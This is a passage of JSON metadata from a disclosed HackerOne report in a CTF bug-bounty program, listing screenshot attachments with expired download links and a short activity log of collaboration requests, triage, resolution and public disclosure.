PS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=8d41d86742ea4e6ddcfd868148033a3b80f5c24568b9d84ba43f012d34b8b5d7","file_size":63465,"type":"image/png"},{"id":434524,"file_name":"Selection_215.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/524/187a7384a2c790c12029cf40290bb2dff9d0ac49/Selection_215.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_215.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_215.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=e356d976d7bc25539a841f2aac46a8d4a50793a2b15932870e0fbf1df40fd347","file_size":75582,"type":"image/png"},{"id":434528,"file_name":"Selection_216.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/528/85f719eb9ea934140f3ec0aec527c28c9f4f74c4/Selection_216.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_216.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_216.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=b1b7c6ca38c17e9aa07d04b79a4fbc1b476c03bab34ecaa8ba45590dc9ad7db1","file_size":88102,"type":"image/png"},{"id":434530,"file_name":"Selection_217.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/530/26753290d90275eb0c74037b172c0f97b39477f4/Selection_217.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_217.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_217.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=86b3831e97b5dbeefae46b75142fbecc4545dae327390b4de59845d0637485d2","file_size":59581,"type":"image/png"}],"allow_singular_disclosure_at":"2019-05-08T15:55:25.997Z","allow_singular_disclosure_after":-51891295.34044391,"singular_disclosure_allowed":true,"vote_count":8,"voters":["checkm50","bughunterninja","mygf","realtess","armansameer","sheeemme","globalenigma","dsdroid"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4247729,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you guys enabled the collaboration feature? I'd like to add @corb3nik as a collaborator...","markdown_message":"\u003cp\u003eCan you guys enabled the collaboration feature? I\u0026#39;d like to add \u003ca href=\"/corb3nik\"\u003e@corb3nik\u003c/a\u003e as a collaborator...\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-03T18:05:36.093Z","updated_at":"2019-03-03T18:05:36.093Z","actor":{"username":"ret2jazzy","cleared":true,"url":"/ret2jazzy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/106/874/b65d946b97ff3d971a091fc805c27b72ef815dd7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4256908,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for sending in this report.  We'll close it and enable disclosure once the CTF has closed and all reports are in.\n\n(Also, I will enable collaboration tomorrow and make sure he can be added)","markdown_message":"\u003cp\u003eThanks for sending in this report.  We\u0026#39;ll close it and enable disclosure once the CTF has closed and all reports are in.\u003c/p\u003e\n\n\u003cp\u003e(Also, I will enable collaboration tomorrow and make sure he can be added)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-05T01:26:17.076Z","updated_at":"2019-03-05T01:26:17.076Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4270673,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great! When does the CTF close btw?","markdown_message":"\u003cp\u003eGreat! When does the CTF close btw?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-06T20:11:39.575Z","updated_at":"2019-03-06T20:11:39.575Z","actor":{"username":"ret2jazzy","cleared":true,"url":"/ret2jazzy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/106/874/b65d946b97ff3d971a091fc805c27b72ef815dd7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4303559,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @daeken, would you please enable collaboration so I can invite @corb3nik?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/daeken\"\u003e@daeken\u003c/a\u003e, would you please enable collaboration so I can invite \u003ca href=\"/corb3nik\"\u003e@corb3nik\u003c/a\u003e?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-11T22:33:43.206Z","updated_at":"2019-03-11T22:33:43.206Z","actor":{"username":"ret2jazzy","cleared":true,"url":"/ret2jazzy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/106/874/b65d946b97ff3d971a091fc805c27b72ef815dd7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4492847,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","markdown_message":"\u003cp\u003eThank you for the amazing report! We\u0026#39;ll be announcing the winners shortly, so we\u0026#39;ll let you know if you\u0026#39;re one of the reports selected. Going to close this and then request public disclosure now.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T18:34:19.042Z","updated_at":"2019-04-05T18:34:19.042Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ret2jazzy","url":"/ret2jazzy"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509089,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:55:25.955Z","updated_at":"2019-04-08T15:55:25.955Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509090,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:55:34.145Z","updated_at":"2019-04-08T15:55:34.145Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}